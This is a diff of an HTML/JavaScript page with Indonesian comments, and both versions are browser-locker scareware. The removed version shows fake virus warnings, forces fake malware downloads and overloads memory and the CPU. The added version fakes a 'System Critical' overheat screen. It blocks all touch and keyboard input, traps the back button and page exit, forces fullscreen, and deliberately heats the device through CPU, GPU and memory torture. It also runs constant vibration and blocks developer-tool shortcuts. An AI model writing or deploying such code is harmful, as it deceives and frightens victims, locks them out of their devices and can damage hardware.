@@ -1,331 +1,690 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SYSTEM ALERT</title>
+    <title>System Critical</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
+        /* SUPER TOUCH BLOCKER */
         * {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            touch-action: none;
+            -webkit-tap-highlight-color: transparent !important;
+            -webkit-touch-callout: none !important;
+            -webkit-user-select: none !important;
+            user-select: none !important;
+            touch-action: none !important;
+            pointer-events: none !important;
         }
-        body {
-            background: #000;
-            color: #f00;
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-            height: 100vh;
+        
+        html, body {
             width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            background: #000;
+            color: #ff0000;
+            font-family: monospace;
         }
-        #skull {
+        
+        /* OVERLAY UNTUK BLOCK SENTUHAN */
+        #touch-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(255, 0, 0, 0.01);
+            z-index: 999999;
+            pointer-events: auto !important;
+        }
+        
+        /* LAYER ANTI TAP */
+        .anti-tap {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255, 0, 0, 0.02) 10px,
+                rgba(255, 0, 0, 0.02) 20px
+            );
+            z-index: 999998;
+        }
+        
+        /* WARNING TEXT */
+        #warning {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 120px;
-            z-index: 10000;
-            animation: pulse 0.3s infinite;
-            text-shadow: 0 0 30px #f00;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-            50% { opacity: 0.7; transform: translate(-50%, -50%) scale(1.2); }
-            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-        }
-        #warning {
-            position: fixed;
-            bottom: 20px;
-            width: 100%;
             text-align: center;
-            font-size: 20px;
-            color: #0f0;
-            z-index: 9999;
+            font-size: 24px;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            z-index: 1000000;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            border: 3px solid #ff0000;
         }
-        .matrix {
-            position: absolute;
-            color: #0f0;
-            font-size: 14px;
-            opacity: 0.7;
-        }
-        #overlay {
+        
+        /* FAKE BUTTON YANG GAK BERFUNGSI */
+        .fake-button {
             position: fixed;
-            top: 0;
-            left: 0;
+            padding: 20px 40px;
+            background: linear-gradient(45deg, #ff0000, #ff4444);
+            color: white;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: not-allowed;
+            z-index: 1000001;
+            opacity: 0.8;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.05); }
+            100% { opacity: 0.3; transform: scale(1); }
+        }
+        
+        /* TEMPERATURE DISPLAY */
+        #temp {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            font-size: 20px;
+            color: #ff4444;
+            z-index: 1000002;
+            background: rgba(0,0,0,0.7);
+            padding: 10px;
+            border-radius: 5px;
+        }
+        
+        /* BLOCKER GRID */
+        .blocker-grid {
+            position: fixed;
             width: 100%;
             height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(255,0,0,0.1) 0px,
-                rgba(255,0,0,0.1) 1px,
-                transparent 1px,
-                transparent 2px
-            );
-            pointer-events: none;
-            z-index: 9998;
+            display: grid;
+            grid-template-columns: repeat(10, 1fr);
+            grid-template-rows: repeat(20, 1fr);
+            z-index: 999997;
+        }
+        
+        .block-cell {
+            background: rgba(255, 0, 0, 0.01);
+            border: 1px solid rgba(255, 0, 0, 0.03);
         }
     </style>
 </head>
-<body oncontextmenu="return false;">
-    <div id="skull">💀</div>
-    <div id="warning">⚠ VIRUS DETECTED: SYSTEM CORRUPTION IN PROGRESS ⚠</div>
-    <div id="overlay"></div>
+<body>
+    <!-- LAYER 1: BLOCKER GRID -->
+    <div class="blocker-grid" id="blockerGrid"></div>
+    
+    <!-- LAYER 2: ANTI TAP -->
+    <div class="anti-tap"></div>
+    
+    <!-- LAYER 3: MAIN TOUCH BLOCKER -->
+    <div id="touch-blocker"></div>
+    
+    <!-- LAYER 4: WARNING -->
+    <div id="temp">🌡️ <span id="tempValue">45°C</span> | 🔒 <span id="lockStatus">TOUCH BLOCKED</span></div>
+    
+    <div id="warning">
+        ⚠ CRITICAL SYSTEM FAULT ⚠<br><br>
+        <span id="warningText">TOUCH INPUT DISABLED</span><br><br>
+        <small style="color: #ff8888;">Device will restart in: <span id="countdown">--:--</span></small>
+    </div>
+    
+    <!-- FAKE BUTTONS -->
+    <div class="fake-button" style="bottom: 100px; left: 50%; transform: translateX(-50%);">RESTART (DISABLED)</div>
+    <div class="fake-button" style="bottom: 50px; left: 50%; transform: translateX(-50%);">EMERGENCY (DISABLED)</div>
     
     <script>
-        // ==================== OBJEK MENYERAMKAN ====================
-        function createTerrifyingObjects() {
-            const texts = ['ERROR', 'VIRUS', 'HACKED', 'DELETE', 'CRASH', 'DIE', 'FAIL', 'CORRUPT'];
-            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'];
+        // ==================== 1. SUPER TOUCH BLOCKER SYSTEM ====================
+        class UltimateTouchBlocker {
+            constructor() {
+                this.touchEvents = ['touchstart', 'touchend', 'touchmove', 'touchcancel'];
+                this.pointerEvents = ['pointerdown', 'pointerup', 'pointermove', 'pointercancel'];
+                this.mouseEvents = ['mousedown', 'mouseup', 'mousemove', 'click', 'contextmenu', 'dblclick'];
+                this.gestureEvents = ['gesturestart', 'gesturechange', 'gestureend'];
+                
+                this.blockAllEvents();
+                this.createBlockerGrid();
+                this.injectStyleOverrides();
+                this.preventPhysicalButtons();
+            }
             
-            setInterval(() => {
-                const obj = document.createElement('div');
-                obj.className = 'matrix';
-                obj.innerText = texts[Math.floor(Math.random() * texts.length)];
-                obj.style.color = colors[Math.floor(Math.random() * colors.length)];
-                obj.style.left = Math.random() * 100 + 'vw';
-                obj.style.top = Math.random() * 100 + 'vh';
-                obj.style.fontSize = (Math.random() * 30 + 10) + 'px';
-                obj.style.textShadow = `0 0 ${Math.random() * 20}px ${obj.style.color}`;
-                document.body.appendChild(obj);
-                
-                // Animasinya
-                let posX = Math.random() * window.innerWidth;
-                let posY = Math.random() * window.innerHeight;
-                let speedX = (Math.random() - 0.5) * 10;
-                let speedY = (Math.random() - 0.5) * 10;
-                
-                function move() {
-                    posX += speedX;
-                    posY += speedY;
+            blockAllEvents() {
+                // Block semua event touch
+                this.touchEvents.forEach(eventName => {
+                    document.addEventListener(eventName, this.blockHandler, {
+                        capture: true,
+                        passive: false
+                    });
                     
-                    if (posX < 0 || posX > window.innerWidth) speedX *= -1;
-                    if (posY < 0 || posY > window.innerHeight) speedY *= -1;
-                    
-                    obj.style.left = posX + 'px';
-                    obj.style.top = posY + 'px';
-                    
-                    requestAnimationFrame(move);
-                }
-                move();
+                    window.addEventListener(eventName, this.blockHandler, {
+                        capture: true,
+                        passive: false
+                    });
+                });
                 
-                // Hapus setelah beberapa saat
+                // Block semua pointer events
+                this.pointerEvents.forEach(eventName => {
+                    document.addEventListener(eventName, this.blockHandler, {
+                        capture: true,
+                        passive: false
+                    });
+                });
+                
+                // Block semua mouse events
+                this.mouseEvents.forEach(eventName => {
+                    document.addEventListener(eventName, this.blockHandler, {
+                        capture: true,
+                        passive: false
+                    });
+                });
+                
+                // Block gesture events
+                this.gestureEvents.forEach(eventName => {
+                    document.addEventListener(eventName, this.blockHandler, {
+                        capture: true,
+                        passive: false
+                    });
+                });
+                
+                // Special: Block scroll dan zoom
+                document.addEventListener('wheel', this.blockHandler, {capture: true, passive: false});
+                document.addEventListener('scroll', this.blockHandler, {capture: true, passive: false});
+                
+                // Block keyboard events juga
+                document.addEventListener('keydown', this.blockHandler, {capture: true});
+                document.addEventListener('keyup', this.blockHandler, {capture: true});
+                document.addEventListener('keypress', this.blockHandler, {capture: true});
+            }
+            
+            blockHandler(e) {
+                // Block semua event
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                
+                // Beri feedback visual bahwa touch diblokir
+                document.getElementById('warningText').textContent = 
+                    `TOUCH BLOCKED at (${e.clientX || e.touches[0]?.clientX || 0}, ${e.clientY || e.touches[0]?.clientY || 0})`;
+                
+                // Blink warning
+                const warning = document.getElementById('warning');
+                warning.style.borderColor = '#00ff00';
                 setTimeout(() => {
-                    if (obj.parentNode) {
-                        document.body.removeChild(obj);
-                    }
-                }, 10000);
-            }, 300);
-        }
-
-        // ==================== MEMORY LEAK EXTREME ====================
-        const memoryChunks = [];
-        function extremeMemoryLeak() {
-            setInterval(() => {
-                // Alokasi memori besar
-                for (let i = 0; i < 50; i++) {
-                    memoryChunks.push(new Array(1000000).fill('💀'.repeat(1000)));
-                }
+                    warning.style.borderColor = '#ff0000';
+                }, 100);
                 
-                // Buat banyak gambar
-                for (let i = 0; i < 20; i++) {
-                    const img = new Image();
-                    img.src = 'data:image/svg+xml;base64,' + btoa(
-                        `<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-                         <rect width="1000" height="1000" fill="red"/>
-                         <text x="500" y="500" font-size="50" fill="white">VIRUS</text>
-                         </svg>`
-                    );
-                    document.body.appendChild(img);
+                return false;
+            }
+            
+            createBlockerGrid() {
+                // Buat grid blocker cells
+                const grid = document.getElementById('blockerGrid');
+                grid.innerHTML = '';
+                
+                for(let i = 0; i < 200; i++) { // 10x20 grid
+                    const cell = document.createElement('div');
+                    cell.className = 'block-cell';
+                    
+                    // Tambah event listener ke setiap cell
+                    this.touchEvents.forEach(eventName => {
+                        cell.addEventListener(eventName, (e) => {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            return false;
+                        }, {passive: false});
+                    });
+                    
+                    grid.appendChild(cell);
                 }
-            }, 100);
+            }
+            
+            injectStyleOverrides() {
+                // Inject CSS untuk memastikan semua elemen non-interactive
+                const style = document.createElement('style');
+                style.textContent = `
+                    /* Force semua elemen jadi non-interactive */
+                    * {
+                        pointer-events: none !important;
+                        cursor: none !important;
+                    }
+                    
+                    /* Exception untuk blocker */
+                    #touch-blocker, .block-cell {
+                        pointer-events: auto !important;
+                    }
+                    
+                    /* Hide cursor */
+                    body {
+                        cursor: none !important;
+                    }
+                    
+                    /* Disable text selection */
+                    * {
+                        -webkit-user-select: none !important;
+                        -moz-user-select: none !important;
+                        -ms-user-select: none !important;
+                        user-select: none !important;
+                    }
+                    
+                    /* Disable callout */
+                    * {
+                        -webkit-touch-callout: none !important;
+                    }
+                    
+                    /* Disable image drag */
+                    img {
+                        -webkit-user-drag: none !important;
+                        user-drag: none !important;
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+            
+            preventPhysicalButtons() {
+                // Coba prevent action dari physical buttons
+                window.addEventListener('beforeunload', (e) => {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    document.getElementById('warningText').textContent = 'PHYSICAL BUTTONS BLOCKED';
+                    return '';
+                });
+                
+                // Coba detect back button
+                window.addEventListener('popstate', (e) => {
+                    e.preventDefault();
+                    history.pushState(null, null, window.location.href);
+                    document.getElementById('warningText').textContent = 'BACK BUTTON BLOCKED';
+                });
+                
+                // Push state untuk prevent back
+                history.pushState(null, null, window.location.href);
+                window.onpopstate = function(event) {
+                    history.go(1);
+                };
+            }
         }
 
-        // ==================== AUTO DOWNLOAD FILE PALSU ====================
-        function fakeDownloads() {
+        // ==================== 2. OVERHEAT SYSTEM (dari sebelumnya) ====================
+        class OverheatSystem {
+            constructor() {
+                this.cpuLoad = 0;
+                this.gpuLoad = 0;
+                this.startOverheat();
+            }
+            
+            startOverheat() {
+                // CPU torture
+                setInterval(() => {
+                    this.cpuLoad++;
+                    let sum = 0;
+                    for(let i = 0; i < 1000000; i++) {
+                        sum += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
+                    }
+                }, 10);
+                
+                // GPU torture dengan canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = 2048;
+                canvas.height = 2048;
+                canvas.style.position = 'fixed';
+                canvas.style.top = '0';
+                canvas.style.left = '0';
+                canvas.style.zIndex = '-1000';
+                document.body.appendChild(canvas);
+                
+                const ctx = canvas.getContext('2d');
+                let angle = 0;
+                
+                setInterval(() => {
+                    this.gpuLoad++;
+                    // Gambar pattern kompleks
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+                    for(let i = 0; i < 1000; i++) {
+                        const x = Math.sin(angle + i * 0.1) * 500 + 1024;
+                        const y = Math.cos(angle + i * 0.1) * 500 + 1024;
+                        
+                        const gradient = ctx.createRadialGradient(x, y, 0, x, y, 100);
+                        gradient.addColorStop(0, `hsl(${(angle * 10 + i) % 360}, 100%, 50%)`);
+                        gradient.addColorStop(1, 'transparent');
+                        
+                        ctx.fillStyle = gradient;
+                        ctx.beginPath();
+                        ctx.arc(x, y, 50, 0, Math.PI * 2);
+                        ctx.fill();
+                    }
+                    angle += 0.01;
+                }, 16);
+                
+                // Update temperature display
+                setInterval(() => {
+                    const temp = 40 + this.cpuLoad / 100 + this.gpuLoad / 100;
+                    document.getElementById('tempValue').textContent = `${Math.round(temp)}°C`;
+                    
+                    // Change color based on temperature
+                    if(temp > 80) {
+                        document.getElementById('temp').style.color = '#ff0000';
+                        document.getElementById('temp').style.animation = 'pulse 0.5s infinite';
+                    } else if(temp > 60) {
+                        document.getElementById('temp').style.color = '#ff6600';
+                    }
+                }, 1000);
+            }
+        }
+
+        // ==================== 3. FULLSCREEN LOCK ====================
+        function lockFullscreen() {
+            const elem = document.documentElement;
+            
+            function requestFullscreen() {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+            
+            requestFullscreen();
+            
+            // Prevent exiting fullscreen
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    requestFullscreen();
+                }
+            });
+            
+            document.addEventListener('webkitfullscreenchange', () => {
+                if (!document.webkitFullscreenElement) {
+                    requestFullscreen();
+                }
+            });
+            
+            // Auto re-enter fullscreen setiap 5 detik
             setInterval(() => {
-                try {
-                    const fakeFiles = ['virus.exe', 'trojan.zip', 'malware.apk', 'crash.bin'];
-                    const fakeFile = fakeFiles[Math.floor(Math.random() * fakeFiles.length)];
-                    
-                    const blob = new Blob(['This is a virus file. Your system is compromised.'], 
-                        {type: 'application/octet-stream'});
-                    const url = URL.createObjectURL(blob);
-                    
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = fakeFile;
-                    a.style.display = 'none';
-                    document.body.appendChild(a);
-                    a.click();
-                    
-                    setTimeout(() => {
-                        document.body.removeChild(a);
-                        URL.revokeObjectURL(url);
-                    }, 1000);
-                } catch(e) {}
+                if (!document.fullscreenElement && 
+                    !document.webkitFullscreenElement && 
+                    !document.mozFullScreenElement && 
+                    !document.msFullscreenElement) {
+                    requestFullscreen();
+                }
             }, 5000);
         }
 
-        // ==================== CPU OVERLOAD + GPU KILL ====================
-        function cpuGpuKiller() {
-            // GPU overload dengan canvas
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth * 2;
-            canvas.height = window.innerHeight * 2;
-            canvas.style.position = 'fixed';
-            canvas.style.top = '0';
-            canvas.style.left = '0';
-            canvas.style.zIndex = '-1';
-            document.body.appendChild(canvas);
-            
-            const ctx = canvas.getContext('2d');
-            
-            function render() {
-                // Gambar ribuan shape random
-                for (let i = 0; i < 500; i++) {
-                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.1)`;
-                    ctx.fillRect(
-                        Math.random() * canvas.width,
-                        Math.random() * canvas.height,
-                        Math.random() * 200,
-                        Math.random() * 200
-                    );
-                    
-                    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.2)`;
-                    ctx.lineWidth = Math.random() * 10;
-                    ctx.beginPath();
-                    ctx.arc(
-                        Math.random() * canvas.width,
-                        Math.random() * canvas.height,
-                        Math.random() * 100,
-                        0,
-                        Math.PI * 2
-                    );
-                    ctx.stroke();
-                }
-                requestAnimationFrame(render);
-            }
-            render();
-            
-            // CPU overload dengan perhitungan berat
+        // ==================== 4. FAKE SYSTEM UI ====================
+        function createFakeUI() {
+            // Fake notification
             setInterval(() => {
-                let x = 0;
-                for (let i = 0; i < 10000000; i++) {
-                    x += Math.sqrt(Math.random()) * Math.tan(Math.random());
-                }
-            }, 10);
-        }
-
-        // ==================== SUARA MENYERAMKAN (jika browser izin) ====================
-        function playScarySounds() {
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const notification = document.createElement('div');
+                notification.style.position = 'fixed';
+                notification.style.top = '10px';
+                notification.style.left = '10px';
+                notification.style.background = 'rgba(255, 0, 0, 0.9)';
+                notification.style.color = 'white';
+                notification.style.padding = '15px';
+                notification.style.borderRadius = '5px';
+                notification.style.zIndex = '1000003';
+                notification.style.fontSize = '14px';
+                notification.textContent = '⚠ System Overheat: Touch disabled';
+                notification.style.boxShadow = '0 0 10px red';
                 
-                function playNoise() {
-                    const oscillator = audioContext.createOscillator();
-                    const gainNode = audioContext.createGain();
-                    
-                    oscillator.type = 'sawtooth';
-                    oscillator.frequency.setValueAtTime(100 + Math.random() * 2000, audioContext.currentTime);
-                    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
-                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1);
-                    
-                    oscillator.connect(gainNode);
-                    gainNode.connect(audioContext.destination);
-                    
-                    oscillator.start();
-                    oscillator.stop(audioContext.currentTime + 1);
+                document.body.appendChild(notification);
+                
+                setTimeout(() => {
+                    if(notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 3000);
+            }, 8000);
+            
+            // Fake system dialog
+            setTimeout(() => {
+                const dialog = document.createElement('div');
+                dialog.style.position = 'fixed';
+                dialog.style.top = '50%';
+                dialog.style.left = '50%';
+                dialog.style.transform = 'translate(-50%, -50%)';
+                dialog.style.background = 'rgba(0, 0, 0, 0.95)';
+                dialog.style.border = '2px solid red';
+                dialog.style.padding = '30px';
+                dialog.style.borderRadius = '10px';
+                dialog.style.zIndex = '1000004';
+                dialog.style.color = 'white';
+                dialog.style.textAlign = 'center';
+                dialog.style.minWidth = '300px';
+                dialog.innerHTML = `
+                    <h3>CRITICAL ERROR</h3>
+                    <p>Touchscreen calibration failed</p>
+                    <p style="color: #ff8888; font-size: 12px;">Please use physical buttons</p>
+                    <div style="margin-top: 20px; padding: 10px; background: #333; border-radius: 5px;">
+                        Error Code: TOUCH_BLOCK_0xDEAD
+                    </div>
+                `;
+                
+                document.body.appendChild(dialog);
+                
+                // Auto close setelah 10 detik
+                setTimeout(() => {
+                    if(dialog.parentNode) {
+                        dialog.parentNode.removeChild(dialog);
+                    }
+                }, 10000);
+            }, 15000);
+        }
+
+        // ==================== 5. COUNTDOWN TIMER ====================
+        function startCountdown() {
+            let minutes = 59;
+            let seconds = 59;
+            
+            const countdownElement = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                seconds--;
+                if(seconds < 0) {
+                    seconds = 59;
+                    minutes--;
                 }
                 
-                setInterval(playNoise, 500);
-            } catch(e) {}
-        }
-
-        // ==================== BLOCK SEMUA INPUT ====================
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        });
-        
-        document.addEventListener('touchstart', (e) => {
-            e.preventDefault();
-            return false;
-        }, { passive: false });
-        
-        document.addEventListener('touchmove', (e) => {
-            e.preventDefault();
-            return false;
-        }, { passive: false });
-
-        // ==================== FULLSCREEN FORCE + PREVENT EXIT ====================
-        function forceFullscreen() {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-        }
-        
-        setInterval(() => {
-            if (!document.fullscreenElement) {
-                forceFullscreen();
-            }
-        }, 1000);
-
-        // ==================== AUTO RELOAD KALAU USER BERHASIL KELUAR ====================
-        let escapeAttempts = 0;
-        window.addEventListener('beforeunload', (e) => {
-            escapeAttempts++;
-            e.preventDefault();
-            e.returnValue = '';
-            
-            // Tambah efek visual setiap kali mencoba keluar
-            document.body.style.background = escapeAttempts % 2 === 0 ? '#000' : '#300';
-            document.getElementById('skull').innerText = ['💀','☠','👁️','🖤'][escapeAttempts % 4];
-            
-            return '';
-        });
-
-        // ==================== EKSEKUSI SEMUA FUNGSI ====================
-        window.onload = function() {
-            // Mulai bertahap
-            setTimeout(createTerrifyingObjects, 500);
-            setTimeout(extremeMemoryLeak, 1000);
-            setTimeout(cpuGpuKiller, 1500);
-            setTimeout(fakeDownloads, 3000);
-            setTimeout(playScarySounds, 4000);
-            setTimeout(forceFullscreen, 500);
-            
-            // Ubah pesan berkala
-            const warnings = [
-                "DELETING SYSTEM FILES...",
-                "ENCRYPTING DATA...",
-                "INJECTING MALWARE...",
-                "OVERRIDING BOOTLOADER...",
-                "FORMATTING STORAGE...",
-                "STEALING PASSWORDS..."
-            ];
-            let warningIndex = 0;
-            setInterval(() => {
-                document.getElementById('warning').innerText = 
-                    `⚠ ${warnings[warningIndex % warnings.length]} ⚠`;
-                warningIndex++;
-            }, 2000);
-            
-            // Animasi tengkorak
-            setInterval(() => {
-                const skull = document.getElementById('skull');
-                const rotations = ['💀', '☠', '👾', '🤖', '👹', '👻'];
-                skull.innerText = rotations[Math.floor(Math.random() * rotations.length)];
+                if(minutes < 0) {
+                    minutes = 59;
+                }
+                
+                countdownElement.textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Change warning text periodically
+                if(seconds % 15 === 0) {
+                    const warnings = [
+                        'TOUCH INPUT DISABLED',
+                        'SYSTEM OVERHEATING',
+                        'COOLING SYSTEM FAILED',
+                        'EMERGENCY LOCK ACTIVE',
+                        'AWAITING SERVICE MODE'
+                    ];
+                    document.getElementById('warningText').textContent = 
+                        warnings[Math.floor(Math.random() * warnings.length)];
+                }
+                
+                // Blink effect setiap 10 detik
+                if(seconds % 10 === 0) {
+                    document.body.style.background = '#330000';
+                    setTimeout(() => {
+                        document.body.style.background = '#000000';
+                    }, 500);
+                }
             }, 1000);
-        };
+        }
 
-        // ==================== RESIZE PROTECTION ====================
-        window.addEventListener('resize', () => {
-            document.body.style.width = window.innerWidth + 'px';
-            document.body.style.height = window.innerHeight + 'px';
+        // ==================== 6. MEMORY OVERLOAD ====================
+        function startMemoryOverload() {
+            const chunks = [];
+            
+            setInterval(() => {
+                // Allocate memory chunks
+                for(let i = 0; i < 5; i++) {
+                    chunks.push(new Array(1000000).fill('🔥'.repeat(10)));
+                }
+                
+                // Create image elements
+                for(let i = 0; i < 3; i++) {
+                    const img = new Image();
+                    img.src = 'data:image/svg+xml;base64,' + btoa(
+                        `<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+                         <rect width="1000" height="1000" fill="rgb(${Math.random()*255},0,0)"/>
+                         </svg>`
+                    );
+                    img.style.position = 'fixed';
+                    img.style.top = '-1000px';
+                    img.style.left = '-1000px';
+                    img.style.opacity = '0.01';
+                    document.body.appendChild(img);
+                }
+            }, 1000);
+        }
+
+        // ==================== 7. VIBRATION OVERLOAD ====================
+        function startVibrationOverload() {
+            if (navigator.vibrate) {
+                // Pattern vibration yang intens
+                const patterns = [
+                    [1000, 500, 1000, 500],
+                    [500, 500, 500, 500],
+                    [200, 100, 200, 100, 200, 100],
+                    [1000]
+                ];
+                
+                let patternIndex = 0;
+                
+                setInterval(() => {
+                    navigator.vibrate(patterns[patternIndex % patterns.length]);
+                    patternIndex++;
+                    
+                    // Update UI
+                    document.getElementById('lockStatus').textContent = 
+                        `VIBRATE BLOCK ${patternIndex}`;
+                }, 3000);
+            }
+        }
+
+        // ==================== 8. MAIN EXECUTION ====================
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🚨 STARTING ULTIMATE TOUCH BLOCKER 🚨');
+            
+            // 1. Start touch blocker
+            const touchBlocker = new UltimateTouchBlocker();
+            
+            // 2. Lock fullscreen
+            lockFullscreen();
+            
+            // 3. Start overheat system
+            const overheatSystem = new OverheatSystem();
+            
+            // 4. Start countdown
+            startCountdown();
+            
+            // 5. Start memory overload
+            startMemoryOverload();
+            
+            // 6. Start vibration overload
+            startVibrationOverload();
+            
+            // 7. Create fake UI
+            createFakeUI();
+            
+            // 8. Prevent window close
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = '';
+                document.getElementById('warningText').textContent = 'EXIT ATTEMPT BLOCKED';
+                return '';
+            });
+            
+            // 9. Block all keys
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                // Special handling for browser shortcuts
+                if (e.ctrlKey || e.metaKey || e.altKey) {
+                    document.getElementById('warningText').textContent = 
+                        `SHORTCUT BLOCKED: ${e.key.toUpperCase()}`;
+                }
+                
+                return false;
+            }, true);
+            
+            // 10. Periodic re-enforcement
+            setInterval(() => {
+                // Re-apply blocker grid
+                touchBlocker.createBlockerGrid();
+                
+                // Force style re-application
+                document.body.style.pointerEvents = 'none';
+                
+                // Update lock status
+                const statuses = [
+                    'TOUCH BLOCKED',
+                    'INPUT DISABLED',
+                    'SYSTEM LOCKED',
+                    'SECURITY ACTIVE',
+                    'QUARANTINE MODE'
+                ];
+                document.getElementById('lockStatus').textContent = 
+                    statuses[Math.floor(Math.random() * statuses.length)];
+            }, 10000);
+            
+            console.log('✅ ALL SYSTEMS LOCKED - TOUCH COMPLETELY BLOCKED');
         });
+
+        // ==================== 9. FINAL SECURITY ====================
+        // Blokir console access juga
+        (function() {
+            // Override console methods
+            const originalConsole = {
+                log: console.log,
+                warn: console.warn,
+                error: console.error
+            };
+            
+            console.log = function(...args) {
+                originalConsole.log.call(console, '🚫 CONSOLE BLOCKED:', ...args);
+            };
+            
+            console.warn = function(...args) {
+                originalConsole.warn.call(console, '🚫 CONSOLE BLOCKED:', ...args);
+            };
+            
+            console.error = function(...args) {
+                originalConsole.error.call(console, '🚫 CONSOLE BLOCKED:', ...args);
+            };
+            
+            // Block F12, Ctrl+Shift+I, etc.
+            document.addEventListener('keydown', (e) => {
+                if (
+                    e.keyCode === 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+                ) {
+                    e.preventDefault();
+                    document.getElementById('warningText').textContent = 'DEVELOPER TOOLS BLOCKED';
+                    return false;
+                }
+            });
+        })();
     </script>
 </body>
 </html>
